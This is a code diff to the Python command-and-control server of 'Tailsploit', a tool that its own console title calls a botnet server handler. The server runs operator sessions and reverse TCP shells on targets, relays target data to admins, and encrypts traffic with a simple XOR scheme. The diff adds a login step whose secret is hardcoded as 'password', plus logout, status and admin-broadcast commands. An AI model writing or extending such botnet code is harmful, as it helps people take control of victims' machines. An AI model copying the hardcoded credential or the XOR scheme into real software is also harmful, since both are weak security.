@@ -13,6 +13,9 @@ import datetime
 import ctypes
 import folium
 import select
+import base64
+import pyotp
+from qrcode_term import qrcode_string
 
 # Get the absolute path of the directory containing the script
 script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -102,6 +105,8 @@ class ServerShell:
         self.MAX_ADMINS_CONN = 5
         self.SET_TIMEOUT = 1800
         self.TIMEOUT_SESSION = False
+        self.MFA_SESSION_PSWD = "password"
+        self.MFA_SESSION = False
 
     def handleXOREncryption(self, content_data, key_traffic):
         key_traffic = key_traffic * (len(content_data) // len(key_traffic)) + key_traffic[:len(content_data) % len(key_traffic)]
@@ -128,7 +133,8 @@ class ServerShell:
         # Token is not whitelisted, return "not valid"
         return "--FLAG_TOKEN_NOT_VALID"
 
-    @StaticMethodCommandHandler("task", is_available=True, min_rank=1, reverse_shell_flag=False)
+
+    @StaticMethodCommandHandler("task", is_available=True, reverse_shell_flag=False, min_rank=1)
     def handleViewThreadCommand(self, admin_socket, handleAdminShellCommands, *args):
         thread_info = f"[{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Running Thread / Job Information(s):\n"
         thread_info += f"[{Fore.GREEN}*{Style.RESET_ALL}] Total Thread(s): {Fore.GREEN}{threading.active_count() - 1}{Style.RESET_ALL}\n\n"        
@@ -250,7 +256,6 @@ class ServerShell:
             HandleExceptXOR = self.handleXOREncryption(HandleExcept.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
             admin_socket.send(HandleExceptXOR)
     
-
     @StaticMethodCommandHandler("killsession", is_available=True, min_rank=2, reverse_shell_flag=True)
     def TailsploitKillCurrentSessionTCP(self, admin_socket, admin_username, handleAdminShellCommands, *args):
         try:
@@ -285,7 +290,7 @@ class ServerShell:
                 self.admin_socket = admin_socket
 
                 self.TIME_MS = time.time() * 1000  # Record start time in milliseconds
-
+                
                 # Check if the command exists in the tailsploit_command_handler dictionary
                 CommandFunction = TailsploitCommandHandling.get(handleAdminShellCommands)
                 if handleAdminShellCommands.startswith("target"):
@@ -321,9 +326,12 @@ class ServerShell:
                         # If the command exists, call the associated method and pass admin_socket explicitly
                         CommandFunction(self, admin_socket, admin_username, handleAdminShellCommands, *AdminShellSplitCommand[1:])
                     else:
-                        CommandNotExist = "This command does not exist. (-help / -h)"
-                        CommandNotExistXOR = self.handleXOREncryption(CommandNotExist.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
-                        admin_socket.send(CommandNotExistXOR)
+                        if "--FLAG_MESSAGE_MODE_ADMN" in handleAdminShellCommands:
+                            self.ForwardToAllAdminSocket(handleAdminShellCommands, admin_username)
+                        else:
+                            CommandNotExist = "This command does not exist. (-help / -h)"
+                            CommandNotExistXOR = self.handleXOREncryption(CommandNotExist.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                            admin_socket.send(CommandNotExistXOR)
 
             except ConnectionAbortedError:
                 print(f"{Fore.RED}[-]{Style.RESET_ALL} Tailsploit Admin Session \x1B[4m{admin_username}\x1B[0m Disconnected.")
@@ -400,7 +408,6 @@ class ServerShell:
                 UserDisconnected = f"[{Fore.RED}-{Style.RESET_ALL}] Error, cannot connect to this target (Target may be disconnected)"
                 UserDisconnectedXOR = self.handleXOREncryption(UserDisconnected.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                 admin_socket.send(UserDisconnectedXOR)
-                admin_socket.send("ERRUR".encode())
         else:
             WarningSession = f"{Fore.YELLOW}[*]{Style.RESET_ALL} You need to be in a reverse TCP Session in order to ping the session."
             WarningSessionXOR = self.handleXOREncryption(WarningSession.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
@@ -525,13 +532,23 @@ For more information, see the JSON file located at:
                 uptime = time.time() - join_time
                 uptime_str = self.format_uptime(uptime)
 
-                CurrentSessionInfo = f"[{Fore.GREEN}*{Style.RESET_ALL}] Current Session Information -> {admin_username}:\n\n{Fore.GREEN}{admin_username}{Style.RESET_ALL} - {Fore.YELLOW}{addr[0]}{Style.RESET_ALL}:{Fore.YELLOW}{addr[1]}{Style.RESET_ALL} (Uptime: {Fore.GREEN}{uptime_str}{Style.RESET_ALL})"
+                CurrentSessionInfo = f"[{Fore.GREEN}*{Style.RESET_ALL}] Current Session Information → {admin_username}:\n\n{Fore.GREEN}{admin_username}{Style.RESET_ALL} - {Fore.YELLOW}{addr[0]}{Style.RESET_ALL}:{Fore.YELLOW}{addr[1]}{Style.RESET_ALL} (Uptime: {Fore.GREEN}{uptime_str}{Style.RESET_ALL})"
                 CurrentSessionInfoXOR = self.handleXOREncryption(CurrentSessionInfo.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                 admin_socket.send(CurrentSessionInfoXOR)
             else:
                 AdminNotFound = f"[-] Admin {admin_username} not found."
                 AdminNotFoundXOR = self.handleXOREncryption(AdminNotFound.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                 admin_socket.send(AdminNotFoundXOR)
+
+    @StaticMethodCommandHandler("authstatus", is_available=True, min_rank=3, reverse_shell_flag=False)
+    def handleServerAuthorizationDetails(self, admin_socket, admin_username, handleAmdminShellCommands, *args):
+        AuthorizationStatus = f"""[{Fore.GREEN}*{Style.RESET_ALL}] Server Authorization Details / Status:
+                
+Server Encryption Communication : {Fore.GREEN}Enabled{Style.RESET_ALL}
+Server Authentication Token : {Fore.GREEN}Enabled{Style.RESET_ALL}
+Server Session Timed out : {Fore.GREEN if self.TIMEOUT_SESSION else Fore.RED}{ "Enabled" if self.TIMEOUT_SESSION else "Disabled"}{Style.RESET_ALL}"""
+        AuthorizationStatusXOR = self.handleXOREncryption(AuthorizationStatus.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+        admin_socket.send(AuthorizationStatusXOR)
 
     def format_uptime(self, uptime):
         days = int(uptime // (60 * 60 * 24))
@@ -597,7 +614,6 @@ For more information, see the JSON file located at:
                 print(f"{Fore.RED}[-]{Style.RESET_ALL} Connection has been rejected - Token Revoked ({Fore.RED}{client_addr[0]}:{client_addr[1]}{Style.RESET_ALL})")
                 if self.TAILSPLOIT_LOG_WEBOOK:
                     TailsploitIncomingConnectionAdminClientRejectedTokenRevoked(client_addr)
-
             else:
                 OnAuthTokenResult = True
 
@@ -605,6 +621,30 @@ For more information, see the JSON file located at:
                 OnAuthorizeToken = f"--FLAG_TAILSPLOIT_AUTHENTICATION?AUTHORIZED={AUTHENTICATION_KEY}"
                 AUTHORIZED_TOKEN_CONVERTXOR = self.handleXOREncryption(OnAuthorizeToken.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                 client_socket.send(AUTHORIZED_TOKEN_CONVERTXOR)
+
+                if self.MFA_SESSION:
+                    REQUIRE_MFA_FLAG = "--FLAG_MFA_REQUIRED"
+                    REQUIRE_MFA_FLAG_XOR = self.handleXOREncryption(REQUIRE_MFA_FLAG.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                    client_socket.send(REQUIRE_MFA_FLAG_XOR)
+                    while True:
+                        MFA_AUTH_ADMIN = client_socket.recv(1024)
+                        MFA_AUTH_ADMIN_DECODED = self.handleXOREncryption(MFA_AUTH_ADMIN, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
+                        
+                        if MFA_AUTH_ADMIN_DECODED == self.MFA_SESSION_PSWD:
+                            MFA_STATUS_200_FLAG = "--FLAG_MFA_STATUS=200"
+                            MFA_STATUS_200_FLAG_XOR = self.handleXOREncryption(MFA_STATUS_200_FLAG.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                            client_socket.send(MFA_STATUS_200_FLAG_XOR)
+                            break
+                        else:
+                            MFA_STATUS_404_FLAG = "--FLAG_MFA_STATUS=404"
+                            MFA_STATUS_404_FLAG_XOR = self.handleXOREncryption(MFA_STATUS_404_FLAG.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                            client_socket.send(MFA_STATUS_404_FLAG_XOR)
+                            print(f"{Fore.RED}[*]{Style.RESET_ALL} The MFA Code Provided Is Incorrect ({MFA_AUTH_ADMIN_DECODED})")
+                            continue
+                else:
+                    PASS_MFA_FLAG = "--FLAG_MFA_NOT_REQUIRED"
+                    PASS_MFA_FLAG_XOR = self.handleXOREncryption(PASS_MFA_FLAG.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                    client_socket.send(PASS_MFA_FLAG_XOR)
 
                 try:
                     AdminUsernameXOR = client_socket.recv(1024)
@@ -618,6 +658,7 @@ For more information, see the JSON file located at:
                         client_socket.send(UsernameTakenXOR)
                         client_socket.close()
                         print(f"Admin {AdminUsername} username already chosen. Connection closed.")
+
                         return
                     else: 
                         UsernameAvailable = "--FLAG_USERNAME_AVAILABLE"
@@ -657,12 +698,18 @@ For more information, see the JSON file located at:
             InvalidFormatXOR = self.handleXOREncryption(InvalidFormat.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
             admin_socket.send(InvalidFormatXOR)
             return
-        end_time = time.time() * 1000  # Record end time in milliseconds
+        end_time = time.time() * 1000
         response_time = end_time - self.TIME_MS
 
         ResponseTailsploitPing = f"[{Fore.GREEN}*{Style.RESET_ALL}] Tailsploit Server is alive: {Fore.GREEN}{response_time:.2f} ms{Style.RESET_ALL}"
         ResponseTailsploitPingXOR = self.handleXOREncryption(ResponseTailsploitPing.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
         admin_socket.send(ResponseTailsploitPingXOR)
+
+    @StaticMethodCommandHandler("logout", is_available=True, min_rank=1, reverse_shell_flag=False)
+    def TailsploitOnLogout(self, admin_socket, admin_username, handleAdminShellCommands, *args):
+        DisconnectAdminFlag = "--FLAG_LOGOUT_FROM_SERVER"
+        DisconnectAdminFlagXOR = self.handleXOREncryption(DisconnectAdminFlag.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+        admin_socket.send(DisconnectAdminFlagXOR)
 
     @StaticMethodCommandHandler("kick", is_available=True, min_rank=3, reverse_shell_flag=False)
     def TailsploitOnKickAdmin(self, admin_socket, admin_username, handleAdminShellCommands, *args):
@@ -709,7 +756,6 @@ For more information, see the JSON file located at:
             except Exception as e:
                 print("ERROR: ", e)
 
-
     def IncomingDataSocket(self, client_socket, data):
         if data.startswith(b"AUD:"):
             self.ForwardToAdminSocket(data)
@@ -729,6 +775,29 @@ For more information, see the JSON file located at:
     def ForwardToAdminSocket(self, data):
         if self.admin_socket:
             self.admin_socket.send(data)
+    
+    def ForwardToAllAdminSocket(self, handleAdminShellCommands, admin_username):
+        parts = handleAdminShellCommands.split()
+
+        # Check if the string starts with '--FLAG_MESSAGE_MODE_ADMN'
+        if parts and parts[0] == '--FLAG_MESSAGE_MODE_ADMN':
+            # Remove the flag name and keep the rest
+            FormattedStringMessageADMN = ' '.join(parts[1:])
+            StringWithADMN = f"--FLAG_MESSAGE_MODE_ADMN_FORWARDED \x1B[4m{admin_username}\x1B[0m: {FormattedStringMessageADMN}"
+            for admin_username, admin_info in self.admins.items():
+                admin_socket = admin_info['socket']
+                try:
+                    AdminForwardMessageXOR = self.handleXOREncryption(StringWithADMN.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
+                    admin_socket.send(AdminForwardMessageXOR)
+                except Exception as e:
+                    # Handle any exceptions that occur while sending the message to this admin
+                    print(f"Failed to send message to {admin_username}: {str(e)}")
+            print(StringWithADMN)
+        else:
+            # String doesn't start with the flag, handle this case accordingly
+            print("String doesn't start with the flag.")
+
+
 
     def process_data(self, client_socket, decoded_data):
         if decoded_data == "REVERSE_SHELL_THREAD=ISALIVE?TRUE":
@@ -741,7 +810,6 @@ For more information, see the JSON file located at:
         else:
             SendingDataXOR = self.handleXOREncryption(decoded_data.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
             self.admin_socket.send(SendingDataXOR)
-
 
     def TailsploitTimeoutSession(self, timeout_admin_socket, timeout_admin_username):
         print(f"{Fore.RED}[-]{Style.RESET_ALL} Tailsploit Admin Session \x1B[4m{timeout_admin_username}\x1B[0m Timed Out.")
@@ -798,7 +866,6 @@ For more information, see the JSON file located at:
             else:
                 continue
         
-
     def InitializingTailsploitServer(self):
         start_time = time.time()  # Record the start time
 
@@ -827,11 +894,11 @@ For more information, see the JSON file located at:
         server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server_socket.bind((self.SERVER_IP, self.PORT_IP))
         server_socket.listen()
-        end_time = time.time()  # Record the end time after the delay
+        end_time = time.time() 
         elapsed_time_ms = (end_time - start_time) * 1000
         os.system("cls")
         print("")
-        ctypes.windll.kernel32.SetConsoleTitleW("HAHAHAA")
+        ctypes.windll.kernel32.SetConsoleTitleW("Tailsploit Botnet Server Handler")
         print("")
         print(f"""                        
                .*+      Tailsploit Framework Server (Enjoy Pentest !)
